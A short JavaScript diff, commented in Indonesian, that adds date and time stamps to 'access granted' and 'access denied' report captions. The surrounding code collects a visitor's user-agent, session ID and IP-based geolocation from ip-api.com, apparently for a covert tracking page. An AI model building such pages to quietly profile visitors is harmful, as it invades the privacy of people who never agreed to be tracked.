@@ -19,6 +19,20 @@
         // Tambahkan user-agent ke dalam caption
         const session = new URLSearchParams(window.location.search).get("session");
 
+        // Ambil jam dan tanggal saat ini
+const now = new Date();
+const formattedDate = now.toLocaleDateString("id-ID", {
+    year: "numeric",
+    month: "long",
+    day: "numeric",
+});
+const formattedTime = now.toLocaleTimeString("id-ID", {
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+});
+
+            
             // Ambil data lokasi dari API ip-api
         const ipResponse = await fetch("http://ip-api.com/json");
         const ipData = await ipResponse.json();
@@ -37,6 +51,10 @@ Akses Diterima
 
 Informasi Perangkat:
 - User-Agent: ${userAgent}
+
+Tanggal dan Waktu:
+- Tanggal: ${formattedDate}
+- Waktu: ${formattedTime}
 
 Detail Sesi:
 - Session ID: ${session}
@@ -92,6 +110,19 @@ Informasi Lokasi:
         const response = await fetch(fallbackImageURL);
         const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
         const session = new URLSearchParams(window.location.search).get("session");
+
+        // Ambil jam dan tanggal saat ini
+const now = new Date();
+const formattedDate = now.toLocaleDateString("id-ID", {
+    year: "numeric",
+    month: "long",
+    day: "numeric",
+});
+const formattedTime = now.toLocaleTimeString("id-ID", {
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+});
         
         // Ambil user-agent dari browser
         const userAgent = navigator.userAgent;
@@ -114,6 +145,10 @@ Akses Ditolak!!
 
 Informasi Perangkat:
 - User-Agent: ${userAgent}
+
+Tanggal dan Waktu:
+- Tanggal: ${formattedDate}
+- Waktu: ${formattedTime}
 
 Detail Sesi:
 - Session ID: ${session}
